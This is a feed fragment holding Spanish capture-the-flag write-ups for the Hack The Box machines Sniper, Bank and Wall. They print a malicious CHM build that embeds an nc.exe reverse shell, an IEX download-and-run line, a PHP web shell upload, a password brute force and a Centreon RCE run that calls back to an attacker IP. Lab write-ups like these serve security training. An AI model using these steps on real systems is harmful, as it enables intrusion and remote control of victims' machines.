+&lt;blockquote&gt;
+  &lt;p&gt;SeImpersonatePrivilege -&amp;gt; Podríamos utilizar [[Juicy Potato]] pero vamos a explotar la máquina de la forma intencionada.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\inetpub\wwwroot&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Chris&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;db.php -&amp;gt; Credentials
+Chris está en el “Remote Management Users” -&amp;gt; &lt;a href=&quot;/winrm/&quot;&gt;winrm&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Probamos las credenciales para el usuario “Chris”. Son válidas. Pero no tenemos PWNED
+El &lt;a href=&quot;/winrm/&quot;&gt;winrm&lt;/a&gt; no está expuesto hacia fuera, hacemos port forwarding con &lt;a href=&quot;/Chisel/&quot;&gt;Chisel&lt;/a&gt; del puerto 5985.&lt;/p&gt;
+
+&lt;p&gt;Nos conectamos con [&lt;a href=&quot;/winrm/&quot;&gt;winrm&lt;/a&gt; a localhost con las credenciales de “Chris”
+[ ! ] AppLockerBypass puede ser necesario.&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;PrivEsc&lt;/h1&gt;
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C:\Users\Chris\desktop\user.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/priv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Docs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;note.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Chris&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Downloads&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;user.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;note.txt -&amp;gt; En la nota vemos que tenemos que dejar la documentación de una nueva app en la carpeta C:\Docs
+instructions.chm -&amp;gt; Este tipo de archivos son archivos de ayuda&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sospechamos que el tipo de archivo que tenemos que crear es un .chm
+Buscamos por “create malicious chm file”. Para crearlo necesitamos hacerlo en una máquina windows de atacante.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Descargamos HTML Help Workshop porque la herramienta lo requiere.&lt;/li&gt;
+  &lt;li&gt;Utilizamos la herramienta de “nishang” &lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1&quot;&gt;Out-CHM.ps1&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Nos sincronizamos al recurso y creamos el archivo malicioso.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;IEX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Net.WebClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;downloadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Out-CHM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Users\Chris\Desktop\nc.exe -e cmd 10.10.14.13 443&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-HHCPath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:\Program Files (x86)\HTML Help Workshop&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Movemos el archivo malicioso a la máquina víctima a la ruta C:\Docs y nos ponemos en escucha con &lt;strong&gt;netcat&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Escrito el 29-12-2021 a las 01:41 am por creep33.&lt;/p&gt;</content><author><name>creep33</name></author><category term="WriteUps" /><category term="HTB" /><summary type="html">WriteUp con metodología de la máquina Sniper.</summary></entry><entry><title type="html">HTB-Bank</title><link href="http://localhost:4000/HTB-Bank/" rel="alternate" type="text/html" title="HTB-Bank" /><published>2021-12-28T00:00:00+01:00</published><updated>2021-12-28T00:00:00+01:00</updated><id>http://localhost:4000/HTB-Bank</id><content type="html" xml:base="http://localhost:4000/HTB-Bank/">&lt;center&gt;&lt;img src=&quot;/assets/images/WriteUps/Bank.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;IP -&amp;gt; 10.10.10.29&lt;/p&gt;
+
+&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;a href=&quot;/Nmap/&quot;&gt;nmap&lt;/a&gt; y obtenemos los siguientes resultados.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/files/WriteUps/Bank.txt&quot;&gt;Bank Nmap Result&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;http&quot;&gt;http&lt;/h2&gt;
+&lt;h3 id=&quot;whatweb&quot;&gt;whatweb&lt;/h3&gt;
+&lt;p&gt;Utilizamos &lt;a href=&quot;/whatweb/&quot;&gt;whatweb&lt;/a&gt; para extraer informacion pero no obtenemos ninguna información relevante.&lt;/p&gt;
+
+&lt;h3 id=&quot;virtual-hosting&quot;&gt;Virtual Hosting&lt;/h3&gt;
+&lt;p&gt;Probamos a ver si se está realizando virtual hosting. Con el dominio “bank.htb”.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Añadimos en dominio “bank.htb” al /etc/hosts&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;bankhtb&quot;&gt;bank.htb&lt;/h4&gt;
+&lt;p&gt;Vemos un panel de inicio de sesión. Probamos credenciales por defecto pero no conseguimos nada.&lt;/p&gt;
+
+&lt;h5 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h5&gt;
+&lt;p&gt;Fuzzeamos el servicio http con herramientas como &lt;a href=&quot;/wfuzz/&quot;&gt;wfuzz&lt;/a&gt; o &lt;a href=&quot;/gobuster/&quot;&gt;gobuster&lt;/a&gt;. Y obtenemos los siguientes resultados.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;/uploads -&amp;gt; 403
+/assets -&amp;gt; Unrelevant directories 
+/inc -&amp;gt; 4 php scripts
+/balance-transfer -&amp;gt; Lots of .acc files.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Vamos a filtrar para ver si hay algun fichero que pese un valor que se sale de la media en /balance-transfer&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; GET &lt;span class=&quot;s2&quot;&gt;&quot;http://bank.htb/balance-transfer&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oP&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[a-z0-9]{32}\.acc.*&quot;right&quot;.+\s'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{print $1 &quot;-&amp;gt;&quot; $7}'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;FS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&quot;'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k3&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;68576f20e9732f1b2edc4df5b8533230.acc-&amp;gt; 257
+USER: cris\@bank.htb
+PASS: !##HTBB4nkP4ssw0rd!##&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Iniciamos sesión en el panel de inicio de sesión.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Panel de “Support”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Nos permiten subir un archivo al reportar un ticket. Probamos a hacre un ticket de prueba. Y nos reporta que solo podemos subir imágenes. Al subir una imágen vemos que el directorio /uploads es donde se almacenan las imágenes.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Tratamos de subir un archivo php ya que la página funciona con php.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Pero nos reporta que tenemos que subir imágenes.&lt;/p&gt;
+
+&lt;h5 id=&quot;burpsuite&quot;&gt;Burpsuite&lt;/h5&gt;
+&lt;p&gt;Utilizaremos Burpsuite para analizar como se tramite la data.
+Al realizar la petición vemos que en la respuesta, hay un comentario que dice que los archivos .htb lo interpreta con php.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Subimos un script en php con extensión htb&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;WebShell&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Nos enviamos una reverse shell.&lt;/p&gt;
+
+&lt;h2 id=&quot;domain&quot;&gt;Domain&lt;/h2&gt;
+&lt;p&gt;Probamos un ataque de transferencia de zona con la herramienta dig sobre el dominio “bank.htb” ya que es un convenio de HTB.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;DNS: chris.bank.htb -&amp;gt; No vemos nada nuevo&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;PrivEsc&lt;/h1&gt;
+&lt;h2 id=&quot;os&quot;&gt;OS&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami
+hostname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
+&lt;span class=&quot;nb&quot;&gt;ls
+cd &lt;/span&gt;chris
+&lt;span class=&quot;nb&quot;&gt;ls
+cat &lt;/span&gt;user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;user.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;./var/htb/bin/emergency -&amp;gt; Binario compilado de 32 bits SUID&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/var/htb/bin/emergency
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lo ejecutamos y somos root&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /root
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;alt-way&quot;&gt;Alt-way&lt;/h1&gt;
+&lt;p&gt;Otra forma de escalar privilegios sería modificar el archvo /etc/passwd ya que “otros” pueden editar el archivo para incrustarle una contraseña a root.
+Ex:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;/HTB-Ghoul/&quot;&gt;Ghoul&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Escrito el 28-12-2021 a las 05:47 pm por creep33.&lt;/p&gt;</content><author><name>creep33</name></author><category term="WriteUps" /><category term="HTB" /><summary type="html">WriteUp con metodología de la máquina Bank.</summary></entry><entry><title type="html">HTB-Wall</title><link href="http://localhost:4000/HTB-Wall/" rel="alternate" type="text/html" title="HTB-Wall" /><published>2021-12-28T00:00:00+01:00</published><updated>2021-12-28T00:00:00+01:00</updated><id>http://localhost:4000/HTB-Wall</id><content type="html" xml:base="http://localhost:4000/HTB-Wall/">&lt;center&gt;&lt;img src=&quot;/assets/images/WriteUps/Wall.png&quot; /&gt;&lt;/center&gt;
+
+&lt;p&gt;IP -&amp;gt; 10.10.10.157&lt;/p&gt;
+
+&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;Utilizamos &lt;a href=&quot;/Nmap/&quot;&gt;nmap&lt;/a&gt; y obtenemos los siguientes resultados.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/assets/files/WriteUps/Wall.txt&quot;&gt;Wall Nmap Result&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;http&quot;&gt;http&lt;/h2&gt;
+&lt;h3 id=&quot;whatweb&quot;&gt;whatweb&lt;/h3&gt;
+&lt;p&gt;Utilizamos la herramienta &lt;a href=&quot;/whatweb/&quot;&gt;whatweb&lt;/a&gt; para enumerar información del servicio http. Pero no obtenemos información relevante.&lt;/p&gt;
+
+&lt;h3 id=&quot;http-enum&quot;&gt;http-enum&lt;/h3&gt;
+&lt;p&gt;Mediante el script &lt;a href=&quot;/Nmap/&quot;&gt;http-enum&lt;/a&gt; fuzzeamos el servicio web.&lt;/p&gt;
+
+&lt;h3 id=&quot;fuzzing&quot;&gt;Fuzzing&lt;/h3&gt;
+&lt;p&gt;Fuzzeamos el servicio http con herramientas como &lt;a href=&quot;/wfuzz/&quot;&gt;wfuzz&lt;/a&gt; o &lt;a href=&quot;/gobuster/&quot;&gt;gobuster&lt;/a&gt;. Y obtenemos los siguientes resultados.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;monitoring -&amp;gt; 401 -&amp;gt; Probamos credenciales por defecto.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Pero no conseguimos nada.&lt;/p&gt;
+
+&lt;h3 id=&quot;curl&quot;&gt;curl&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Cambiamos tipo de petición a POST&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.157/monitoring -L
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Descubrimos una ruta nueva&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;/centreon&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;browser&quot;&gt;Browser&lt;/h3&gt;
+&lt;p&gt;Panel de inicio de sesión. “Centreon”. Buscamos “Centreon default password” pero las credenciales que encontramos no sirven.
+Podemos buscar a ver si tiene una API, para realizar pruebas. Encontramos una api&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;/centreon/api/index.php&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Realizamos un ataque de fuerza bruta sobre la api con &lt;a href=&quot;/wfuzz/&quot;&gt;wfuzz&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;wfuzz-bruteforce&quot;&gt;wfuzz bruteforce&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; 200 &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;17 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/darkweb2017-top10000.txt &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'username=admin&amp;amp;password=FUZZ'&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.10.157/centreon/api/index.php?action=authenticate&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;USER:: admin
+PASS: password1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;browser-1&quot;&gt;Browser&lt;/h3&gt;
+&lt;p&gt;Iniciamos sesión con las credenciales válidas en /centreon&lt;/p&gt;
+
+&lt;p&gt;Vamos al panel de about para ver que vesión es.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Version: 19.04&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Con &lt;strong&gt;searchsploit&lt;/strong&gt; vemos que tiene una vulnerabilidad de RCE.&lt;/p&gt;
+
+&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python centreon.py &lt;span class=&quot;s1&quot;&gt;'http://10.10.10.157/centreon'&lt;/span&gt; admin password1 10.10.14.13 443 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos ponemos en escucha con &lt;strong&gt;nc&lt;/strong&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Pero en un primer momento no funciona.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Analizamos el script.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Vemos una ruta, en la que crea un “poller” y la inyección la realiza en el campo “nagios_bin”. Que es el campo “Monitoring Engine Binary”.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Realizamos el proceso manualmente.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nos devuelve un 403 Forbidden. Puede que halla un WAF.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Modificamos el script para que funcione como un RCE, cada uso.&lt;/li&gt;
+  &lt;li&gt;Probamos diferentes payloads, y nos damos cuenta que el ‘ ‘ no le gusta.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;[ ! ] En bash el ‘ ‘ también se puede poner como ‘${IFS}’&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Nos funciona.&lt;/li&gt;
+  &lt;li&gt;Nos enviamos una reverse shell “sin usar espacios” (con un index.html y jugando con pipes y curl)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Recibimos el GET pero no la reverse shell&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Dividimos el comando en 2, primero descargando el archivo a una ruta y después ejecutándolo con bash.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Tenemos reverse shell.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;privesc&quot;&gt;PrivEsc&lt;/h1&gt;
+&lt;h2 id=&quot;os&quot;&gt;OS&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
+&lt;span class=&quot;nb&quot;&gt;ls
+cd &lt;/span&gt;shelby
+&lt;span class=&quot;nb&quot;&gt;ls
+cat &lt;/span&gt;user.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;No podemos leer el user.txt
+Vemos un html.zip&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Vamos a traernos el &lt;strong&gt;html.zip&lt;/strong&gt; para analizarlo en nuestra máquina.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;7z x html.zip
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;html
+&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;pass&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Pero no encontramos nada.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Seguimos analizando la máquina víctima.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;id
+cd&lt;/span&gt; / 
+find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;screen-4.5.0 es SUID, y es vulnerable a privilege escalation.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Con &lt;strong&gt;searchploit&lt;/strong&gt; descargamos es script en bash, lo subimos a la máquina víctima ya que cuenta con &lt;strong&gt;gcc&lt;/strong&gt;. Lo ejecutamos y somos root.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/shelby/user.txt
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;user.txt
+root.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
